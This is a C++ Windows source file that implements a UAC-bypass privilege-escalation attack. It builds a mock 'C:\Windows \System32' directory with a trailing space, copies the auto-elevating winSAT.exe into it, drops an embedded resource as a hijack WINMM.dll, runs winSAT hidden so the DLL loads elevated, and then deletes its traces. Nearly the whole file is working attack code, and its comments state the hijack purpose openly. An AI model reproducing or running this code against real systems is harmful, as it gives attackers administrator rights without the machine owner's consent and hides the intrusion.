// DWELLS.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include <Windows.h>
#include <stdio.h>
#include <aclapi.h>
#include <tchar.h>
#include <shellapi.h>
#include <stdlib.h>
#include "resource.h"

#pragma comment(lib, "advapi32.lib")


void PrintError()
{
	DWORD err = GetLastError();
	printf("%d\n");
}

void DropResource(const wchar_t* rsrcName, const wchar_t* filePath) {
	HMODULE hMod = GetModuleHandle(NULL);
	HRSRC res = FindResource(hMod, MAKEINTRESOURCE(IDR_DATA1), rsrcName);
	DWORD dllSize = SizeofResource(hMod, res);
	void* dllBuff = LoadResource(hMod, res);
	HANDLE hDll = CreateFile(filePath, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, NULL);
	DWORD sizeOut;
	WriteFile(hDll, dllBuff, dllSize, &sizeOut, NULL);
	CloseHandle(hDll);
}

// Get it... Because it's a mock directory creator...
// Like the Simpsons... I know it's a reach.
void Muntz()
{
	SECURITY_DESCRIPTOR secDesc;
	secDesc.Dacl = NULL;
	_SHELLEXECUTEINFOW se = {};
	DWORD dwRes, dwDisposition;
	PSID pEveryoneSID = NULL, pAdminSID = NULL;
	PACL pACL = NULL;
	PSECURITY_DESCRIPTOR pSD = NULL;
	EXPLICIT_ACCESS ea[2];
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld =
		SECURITY_WORLD_SID_AUTHORITY;
	SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
	SECURITY_ATTRIBUTES sa;
	LONG lRes;
	HKEY hkSub = NULL;
	int terminateCode = 0;
	// Create a well-known SID for the Everyone group.
	if (!AllocateAndInitializeSid(&SIDAuthWorld, 1,
		SECURITY_WORLD_RID,
		0, 0, 0, 0, 0, 0, 0,
		&pEveryoneSID))
	{
		_tprintf(_T("AllocateAndInitializeSid Error %u\n"), GetLastError());
		goto Cleanup;
	}

	// Initialize an EXPLICIT_ACCESS structure for an ACE.
	// The ACE will allow Everyone read access to the key.
	ZeroMemory(&ea, 2 * sizeof(EXPLICIT_ACCESS));
	ea[0].grfAccessPermissions = GENERIC_ALL;
	ea[0].grfAccessMode = SET_ACCESS;
	ea[0].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[0].Trustee.ptstrName = (LPTSTR)pEveryoneSID;

	// Create a SID for the BUILTIN\Administrators group.
	if (!AllocateAndInitializeSid(&SIDAuthNT, 2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&pAdminSID))
	{
		_tprintf(_T("AllocateAndInitializeSid Error %u\n"), GetLastError());
		goto Cleanup;
	}

	// Initialize an EXPLICIT_ACCESS structure for an ACE.
	// The ACE will allow the Administrators group full access to
	// the key.
	ea[1].grfAccessPermissions = GENERIC_ALL;
	ea[1].grfAccessMode = SET_ACCESS;
	ea[1].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
	ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[1].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[1].Trustee.ptstrName = (LPTSTR)pAdminSID;

	// Create a new ACL that contains the new ACEs.
	dwRes = SetEntriesInAcl(2, ea, NULL, &pACL);
	if (ERROR_SUCCESS != dwRes)
	{
		_tprintf(_T("SetEntriesInAcl Error %u\n"), GetLastError());
		goto Cleanup;
	}

	// Initialize a security descriptor.  
	pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR,
		SECURITY_DESCRIPTOR_MIN_LENGTH);
	if (NULL == pSD)
	{
		_tprintf(_T("LocalAlloc Error %u\n"), GetLastError());
		goto Cleanup;
	}

	if (!InitializeSecurityDescriptor(pSD,
		SECURITY_DESCRIPTOR_REVISION))
	{
		_tprintf(_T("InitializeSecurityDescriptor Error %u\n"),
			GetLastError());
		goto Cleanup;
	}

	// Add the ACL to the security descriptor. 
	if (!SetSecurityDescriptorDacl(pSD,
		TRUE,     // bDaclPresent flag   
		pACL,
		FALSE))   // not a default DACL 
	{
		_tprintf(_T("SetSecurityDescriptorDacl Error %u\n"),
			GetLastError());
		goto Cleanup;
	}

	// Initialize a security attributes structure.
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = pSD;
	sa.bInheritHandle = FALSE;

	// Use the updated SECURITY_ATTRIBUTES to specify
	// security attributes for securable objects.
	// This example uses security attributes during
	// creation of a new directory.
	//if (0 == CreateDirectory(TEXT("C:\\MyFolder"), &sa))
	//{
	//	// Error encountered; generate message and exit.
	//	printf("Failed CreateDirectory\n");
	//	exit(1);
	//}

	if (0 == CreateDirectoryW(L"\\\\?\\C:\\Windows \\", &sa))
	{
		printf("Failed creating windows dir\n");
		PrintError();
		exit(1);
	}

	if (0 == CreateDirectoryW(L"\\\\?\\C:\\Windows \\System32", 0))
	{
		printf("Failed creating System32 dir\n");
		PrintError();
		exit(1);
	}
	CopyFileW(L"C:\\Windows\\System32\\winSAT.exe", L"\\\\?\\C:\\Windows \\System32\\winSAT.exe", false);

	//Drop our dll for hijack
	DropResource(L"DATA", L"\\\\?\\C:\\Windows \\System32\\WINMM.dll");

	//Execute our winSAT.exe copy from fake trusted directory
	se.cbSize = sizeof(_SHELLEXECUTEINFOW);
	se.lpFile = L"C:\\Windows \\System32\\winSAT.exe";
	se.lpParameters = L"formal";
	se.nShow = SW_HIDE;
	se.hwnd = NULL;
	se.lpDirectory = NULL;
	ShellExecuteEx(&se);
	Sleep(3000);
	while (true)
	{
		if (SetFileAttributes(L"\\\\?\\C:\\Windows \\System32\\WINMM.dll",
			GetFileAttributes(L"\\\\?\\C:\\Windows \\System32\\WINMM.dll") & ~(FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN)))
		{
			printf("Couldn't get file attributes. ");
			PrintError();
		}
		DeleteFileW(L"\\\\?\\C:\\Windows \\System32\\WINMM.dll");
		printf("WINMM.dll deleted: ");
		PrintError();
		if (SetFileAttributes(L"\\\\?\\C:\\Windows \\System32\\winSAT.exe",
			GetFileAttributes(L"\\\\?\\C:\\Windows \\System32\\winSAT.exe") & ~(FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN)))
		{
			printf("Couldn't get file attributes. ");
			PrintError();
		}
		DeleteFileW(L"\\\\?\\C:\\Windows \\System32\\winSAT.exe");
		printf("winSAT.exe deleted: ");
		PrintError();
		Sleep(3000);
		RemoveDirectoryW(L"\\\\?\\C:\\Windows \\System32");
		printf("Fake system32 deleted: ");
		PrintError();
		RemoveDirectoryW(L"\\\\?\\C:\\Windows \\");
		printf("Fake windows deleted: ");
		int err = 0;
		err = GetLastError();
		printf("%d\n", err);
		if (err == 2 || err == 3)
		{
			break;
		}
		Sleep(3000);

		// Free the memory allocated for the SECURITY_DESCRIPTOR.

	}

	if (NULL != LocalFree(sa.lpSecurityDescriptor))
	{
		// Error encountered; generate message and exit.
		printf("Failed LocalFree\n");
		exit(1);
	}

Cleanup:

	if (pEveryoneSID)
		FreeSid(pEveryoneSID);
	if (pAdminSID)
		FreeSid(pAdminSID);
	if (pACL)
		LocalFree(pACL);
	if (pSD)
		LocalFree(pSD);
	if (hkSub)
		RegCloseKey(hkSub);

	return;
}